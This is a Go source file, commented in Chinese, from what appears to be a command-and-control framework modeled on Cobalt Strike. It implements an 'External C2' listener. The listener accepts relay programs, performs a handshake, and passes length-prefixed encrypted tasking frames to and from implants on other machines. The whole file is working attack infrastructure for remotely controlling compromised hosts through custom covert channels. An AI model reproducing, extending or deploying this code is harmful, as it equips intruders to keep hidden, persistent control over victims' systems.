// csdev :: extc2_listener.go  --  External C2 listener (协议 v2 的第五种承载层)
//
// External C2 的语义 (对标 Cobalt Strike 的同名能力):
//   它**不是**给植入体直连的通道, 而是给**第三方中转程序**用的接口。中转程序
//   自己决定怎么到达真正的植入体 (自定义协议 / 其他语言 / 云函数 / WebSocket
//   ...), 只要求把 v2 的帧字节原样搬运过来。这样任何外部实现都能接入同一套
//   加密与任务协议, 而不必重新实现 RSA/AES/HMAC。
//
// 线格式 (握手后与 TCP listener 完全一致, 因此中转程序只需复制字节):
//
//	握手:  客户端 -> 服务端: [4B 大端 len][标识串]
//	       服务端 -> 客户端: [4B 大端 len][同样的标识串]      (确认)
//	数据:  客户端 -> 服务端: [4B 大端 len][v2 帧]
//	       服务端 -> 客户端: [4B 大端 len][v2 应答帧]         (len=0 表示空应答)
//
// 用法: csdev-server.exe --extc2 0.0.0.0:9100
// 中转: tools/extc2_relay.go (本仓库提供一个参考实现, 用于端到端验证)
package main

import (
	"crypto/rsa"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"time"
)

const (
	extc2Magic       = "csdev-extc2/1"
	extc2MaxFrame    = 8 * 1024 * 1024
	extc2HandshakeTO = 15 * time.Second
	extc2IdleTO      = 30 * time.Minute
)

type ExtC2Listener struct {
	Name string
	Addr string
	Priv *rsa.PrivateKey

	mu     sync.Mutex
	ln     net.Listener
	conns  map[string]net.Conn
	frames uint64
	start  time.Time
	stop   chan struct{}
}

func NewExtC2Listener(name, addr string, priv *rsa.PrivateKey) *ExtC2Listener {
	return &ExtC2Listener{
		Name: name, Addr: addr, Priv: priv,
		conns: map[string]net.Conn{},
		start: time.Now(),
	}
}

func (l *ExtC2Listener) Start() error {
	ln, err := net.Listen("tcp", l.Addr)
	if err != nil {
		return err
	}
	l.mu.Lock()
	l.ln = ln
	l.stop = make(chan struct{})
	l.mu.Unlock()
	go l.acceptLoop(ln)
	return nil
}

func (l *ExtC2Listener) Stop() {
	if l.stop != nil {
		select {
		case <-l.stop:
		default:
			close(l.stop)
		}
	}
	// 不把 ln 置 nil: 并发运行的 acceptLoop 会读到 nil 而 panic (TCP 侧实测踩到)
	l.mu.Lock()
	if l.ln != nil {
		l.ln.Close() // 关监听 socket, 端口随之释放
	}
	for _, c := range l.conns {
		c.Close()
	}
	l.conns = map[string]net.Conn{}
	l.mu.Unlock()
}

// BoundAddr 返回内核实际绑定的地址。
func (l *ExtC2Listener) BoundAddr() string {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.ln != nil {
		return l.ln.Addr().String()
	}
	return l.Addr
}

func (l *ExtC2Listener) acceptLoop(ln net.Listener) {
	for {
		c, err := ln.Accept()
		if err != nil {
			return
		}
		go l.serve(c)
	}
}

func (l *ExtC2Listener) serve(c net.Conn) {
	addr := c.RemoteAddr().String()
	defer func() {
		c.Close()
		l.mu.Lock()
		delete(l.conns, addr)
		n := len(l.conns)
		l.mu.Unlock()
		logf("[extc2] %s 断开 (当前 %d 条)", addr, n)
	}()

	// --- 握手 ---
	c.SetDeadline(time.Now().Add(extc2HandshakeTO))
	var hdr [4]byte
	if _, err := io.ReadFull(c, hdr[:]); err != nil {
		return
	}
	n := binary.BigEndian.Uint32(hdr[:])
	if n == 0 || n > 256 {
		logf("[extc2] %s 握手长度非法 (%d)", addr, n)
		return
	}
	buf := make([]byte, n)
	if _, err := io.ReadFull(c, buf); err != nil {
		return
	}
	got := strings.TrimRight(string(buf), "\x00")
	if !strings.HasPrefix(got, "csdev-extc2") {
		logf("[extc2] %s 标识不匹配 (%q), 断开", addr, got)
		return
	}
	// 回显同样的标识串作为确认 (与 CS 的 external C2 骨架一致)
	binary.BigEndian.PutUint32(hdr[:], uint32(len(extc2Magic)))
	if _, err := c.Write(hdr[:]); err != nil {
		return
	}
	if _, err := c.Write([]byte(extc2Magic)); err != nil {
		return
	}

	l.mu.Lock()
	l.conns[addr] = c
	cn := len(l.conns)
	l.mu.Unlock()
	logf("[extc2] %s 接入 (标识 %q, 当前 %d 条)", addr, got, cn)
	eventLog("listener", "", "ExternalC2 接入", addr)

	// --- 数据循环 ---
	for {
		c.SetReadDeadline(time.Now().Add(extc2IdleTO))
		if _, err := io.ReadFull(c, hdr[:]); err != nil {
			return
		}
		fn := binary.BigEndian.Uint32(hdr[:])
		if fn == 0 || fn > extc2MaxFrame {
			logf("[extc2] %s 帧长度非法 (%d), 断开", addr, fn)
			return
		}
		frame := make([]byte, fn)
		if _, err := io.ReadFull(c, frame); err != nil {
			return
		}

		l.mu.Lock()
		l.frames++
		l.mu.Unlock()

		resp := v2ProcessFrame(frame, addr, l.Priv)

		c.SetWriteDeadline(time.Now().Add(60 * time.Second))
		if resp == nil {
			binary.BigEndian.PutUint32(hdr[:], 0)
			if _, err := c.Write(hdr[:]); err != nil {
				return
			}
			continue
		}
		if len(resp) > extc2MaxFrame {
			logf("[extc2] %s 应答过大 (%d), 断开", addr, len(resp))
			return
		}
		binary.BigEndian.PutUint32(hdr[:], uint32(len(resp)))
		if _, err := c.Write(hdr[:]); err != nil {
			return
		}
		if _, err := c.Write(resp); err != nil {
			return
		}
	}
}

// ---------------------------------------------------------------- 接线

var gExtC2Listeners []*ExtC2Listener

func startExtC2Listener(spec string, priv *rsa.PrivateKey) error {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return nil
	}
	name := "csdev-extc2"
	l := NewExtC2Listener(name, spec, priv)
	if err := l.Start(); err != nil {
		return err
	}
	gExtC2Listeners = append(gExtC2Listeners, l)

	// 注册表登记与事件日志由 listener_add 路径统一完成 (见 listener_admin.go):
	// 参数启动 (--extc2) 与 REST (/api/listener/add) 走的是同一条 Add。
	logf("  External C2 入口: %s  (第三方中转程序接入点, 握手标识 %q)", spec, extc2Magic)
	return nil
}

func extc2Summary() []map[string]interface{} {
	out := []map[string]interface{}{}
	for _, l := range gExtC2Listeners {
		l.mu.Lock()
		m := map[string]interface{}{
			"name":      l.Name,
			"addr":      l.Addr,
			"conns":     len(l.conns),
			"frames":    l.frames,
			"uptime_ns": time.Since(l.start).Nanoseconds(),
		}
		l.mu.Unlock()
		out = append(out, m)
	}
	return out
}

var _ = fmt.Sprintf
